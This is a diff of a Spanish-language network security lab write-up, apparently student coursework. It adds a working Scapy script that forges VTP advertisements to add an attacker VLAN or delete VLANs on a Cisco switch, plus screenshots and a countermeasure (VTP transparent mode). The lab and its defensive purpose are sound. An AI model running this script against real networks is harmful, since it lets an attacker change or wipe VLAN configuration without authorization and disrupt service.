@@ -116,9 +116,125 @@ python
 # Ataque:     VTP Attack - Agregar y Borrar VLANs
 # Fecha:      2026
 # =============================================================
-[PEGA AQUÍ EL SCRIPT COMPLETO]
+
+from scapy.all import *
+import sys
+import time
+
+IFACE = "eth0"
+
+def build_vtp_summary(domain="ITLA", revision=10000):
+    dot3 = Dot3(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr(IFACE))
+    llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
+    snap = SNAP(OUI=0x00000c, code=0x2003)
+
+    updater_id       = b'\x0a\x0d\x63\x02'     # 10.13.99.2
+    update_timestamp = b"26061123075100"       # 12 bytes ASCII AAMMDDHHMMSS
+    md5_digest       = b'\x00' * 16
+
+    vtp_payload = (
+        b'\x02'                                 # Version (VTPv2)
+        + b'\x01'                               # Code: Summary Advertisement
+        + b'\x00'                               # Followers
+        + len(domain).to_bytes(1, 'big')
+        + domain.encode().ljust(32, b'\x00')
+        + revision.to_bytes(4, 'big')
+        + updater_id
+        + update_timestamp
+        + md5_digest
+    )
+    return dot3 / llc / snap / Raw(load=vtp_payload)
+
+def build_vtp_subset_add(domain="ITLA", revision=10000,
+                         vlan_id=50, vlan_name="ATACANTE"):
+    dot3 = Dot3(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr(IFACE))
+    llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
+    snap = SNAP(OUI=0x00000c, code=0x2003)
+
+    name_bytes = vlan_name.encode().ljust(32, b'\x00')
+    vlan_info = (
+        b'\x06'                                 # VLAN info length field
+        + b'\xa0'
+        + b'\x00'
+        + vlan_id.to_bytes(2, 'big')
+        + b'\x03\xe8'                           # MTU 1000
+        + b'\x00\x07\xa1\x20'
+        + len(vlan_name).to_bytes(1, 'big')
+        + name_bytes
+    )
+    vtp_payload = (
+        b'\x02'                                 # Version (VTPv2)
+        + b'\x02'                               # Code: Subset Advertisement
+        + len(domain).to_bytes(1, 'big')
+        + domain.encode().ljust(32, b'\x00')
+        + revision.to_bytes(4, 'big')
+        + b'\x01'
+        + vlan_info
+    )
+    return dot3 / llc / snap / Raw(load=vtp_payload)
+
+def build_vtp_subset_delete(domain="ITLA", revision=99999):
+    dot3 = Dot3(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr(IFACE))
+    llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
+    snap = SNAP(OUI=0x00000c, code=0x2003)
+
+    vtp_payload = (
+        b'\x02'                                 # Version (VTPv2)
+        + b'\x02'                               # Code: Subset Advertisement
+        + len(domain).to_bytes(1, 'big')
+        + domain.encode().ljust(32, b'\x00')
+        + revision.to_bytes(4, 'big')
+        + b'\x01'
+        # Sin VLAN info = borra todas las VLANs no listadas
+    )
+    return dot3 / llc / snap / Raw(load=vtp_payload)
+
+def agregar_vlan(vlan_id, vlan_name):
+    print(f"\n[*] Enviando VTP Attack: AGREGAR VLAN {vlan_id} - {vlan_name}")
+    sendp(build_vtp_summary(revision=10000), iface=IFACE, verbose=False)
+    time.sleep(0.5)
+    sendp(build_vtp_subset_add(revision=10000, vlan_id=vlan_id,
+          vlan_name=vlan_name), iface=IFACE, count=3, verbose=False)
+    print(f"[+] VLAN {vlan_id} enviada.")
+    print(f"[*] Verifica en SW1: show vlan brief")
+
+def borrar_vlan(vlan_id):
+    print(f"\n[*] Enviando VTP Attack: BORRAR VLAN {vlan_id}")
+    sendp(build_vtp_summary(revision=10001), iface=IFACE, verbose=False)
+    time.sleep(0.5)
+    sendp(build_vtp_subset_delete(revision=10001), iface=IFACE,
+          count=3, verbose=False)
+    print(f"[+] Paquete de borrado enviado.")
+    print(f"[*] Verifica en SW1: show vlan brief")
+
+if __name__ == "__main__":
+    print("=" * 55)
+    print("       ATAQUE VTP — AGREGAR Y BORRAR VLANs")
+    print("       Autor: Henry Vicente Quezada")
+    print("       Matricula: 2025-1332")
+    print("=" * 55)
+    print(f"[*] Interfaz     : {IFACE}")
+    print(f"[*] Dominio VTP  : ITLA")
+    print(f"[*] Presiona Ctrl+C para detener\n")
+    print("1. Agregar VLAN")
+    print("2. Borrar VLAN")
+
+    opcion = input("\nSelecciona opcion: ").strip()
+
+    if opcion == "1":
+        vid    = int(input("VLAN ID a agregar (ej: 50): "))
+        nombre = input("Nombre de la VLAN (ej: ATACANTE): ")
+        agregar_vlan(vid, nombre)
+    elif opcion == "2":
+        vid = int(input("VLAN ID a borrar: "))
+        borrar_vlan(vid)
+    else:
+        print("[-] Opcion invalida")
+        sys.exit(1)
+
 
 🛡️ Contramedida aplicada
+
 SW1(config)# vtp mode transparent
 SW1(config)# end
 SW1# write memory
@@ -175,25 +291,25 @@ SW1# show vlan brief
 
 ### Antes del ataque
 
-![antes](PEGA_IMAGEN_AQUI)
+<img width="736" height="623" alt="image" src="https://github.com/user-attachments/assets/13369e45-d6bc-4204-a5c9-64066beac19b" />
 
 📷 SW1# show vlan brief — Solo VLANs 10, 20 y 99
 
 ### Script en ejecución
 
-![script](PEGA_IMAGEN_AQUI)
+
 
 📷 Kali ejecutando vtp_attack.py — Opción agregar VLAN 50
 
 ### Durante el ataque
 
-![durante](PEGA_IMAGEN_AQUI)
+<img width="848" height="656" alt="image" src="https://github.com/user-attachments/assets/2dd77139-c271-4b8e-b2c3-dd697a10b368" />
 
 📷 SW1# show vlan brief — VLAN 50 ATACANTE agregada sin autorización
 
 ### Contramedida aplicada
 
-![contramedida](PEGA_IMAGEN_AQUI)
+<img width="935" height="719" alt="image" src="https://github.com/user-attachments/assets/0b8b11d9-1263-409e-97fc-401bd01aceb6" />
 
 📷 SW1# show vtp status — Mode: Transparent, ataque bloqueado
 
